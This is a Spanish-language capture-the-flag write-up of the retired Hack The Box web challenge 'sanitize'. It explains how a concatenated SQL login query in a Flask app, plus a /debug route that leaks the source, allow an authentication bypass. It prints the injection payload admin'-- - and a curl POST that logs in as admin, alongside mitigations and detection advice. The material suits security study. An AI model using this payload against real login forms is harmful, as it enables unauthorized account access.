---
challenge: sanitize
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, sqlite, sqli, authentication-bypass, source-disclosure]
---

# sanitize — Hack The Box (Challenge)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flag real.

## TL;DR

La aplicación Flask construye la consulta de login concatenando usuario y contraseña. La ruta `/debug` entrega el código fuente completo. Un comentario SQL en el usuario evita la comprobación de contraseña y permite entrar como `admin`.

## Enunciado y superficie

- Web, Easy, retirado.
- Se entrega una URL con un formulario de login.
- El objetivo es acceder al panel de administración.

```bash
curl -s -I http://<IP>:<PORT>/
```

## Reconocimiento

- Flask con una única ruta `/` y un formulario POST.
- El HTML incluye una referencia a `/debug`.
- `/debug` devuelve `app.py` en texto plano.

```bash
curl -s http://<IP>:<PORT>/debug
```

## Análisis del código

La consulta se monta con formato de cadena:

```python
q = "select * from users where username = '%s' AND password = '%s';" % (
    request.form.get("username", ""),
    request.form.get("password", ""),
)
login = query_db(q, one=True)
```

No hay consultas parametrizadas. La aplicación comprueba después si el usuario devuelto es `admin`.

## Explicación del fallo

Un usuario como `admin'-- -` cierra la cadena y comenta el resto de la consulta, incluida la condición de contraseña. SQLite devuelve la fila de `admin` y la aplicación muestra la flag.

```text
select * from users where username = 'admin'-- -' AND password = '';
```

## Reproducción local

```bash
python3 -m venv venv
. venv/bin/activate
pip install flask
python app.py
```

- Crear la base de datos de ejemplo si no existe.
- Enviar el payload al formulario.
- Verificar la respuesta.

## Explotación

```bash
curl -s -X POST http://<IP>:<PORT>/ \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x"
```

La respuesta contiene la flag; se redacta. También se puede automatizar con `sqlmap` sobre el parámetro `username`, pero no es necesario.

## Evidencia

- Código fuente de `/debug` con la consulta señalada.
- Petición y respuesta con el payload.
- Flag redactada.

## Lecciones aprendidas

- Concatenar entrada en SQL es una inyección, aunque el formulario sea pequeño.
- Una ruta de depuración puede filtrar todo el código.
- El comentario SQL (`--`) es suficiente para eliminar la condición de contraseña.

## Mitigaciones y detección

- Usar consultas parametrizadas y un ORM correctamente.
- No exponer `/debug` ni el código fuente en producción.
- Aplicar validación de entrada y mínimo privilegio a la base de datos.
- Alertar de errores SQL, payloads con `--` y accesos a rutas de depuración.

## Referencias

- <https://www.hackthebox.com/challenges/sanitize>
- <https://owasp.org/www-community/attacks/SQL_Injection>
- <https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>
- <https://attack.mitre.org/techniques/T1190/>
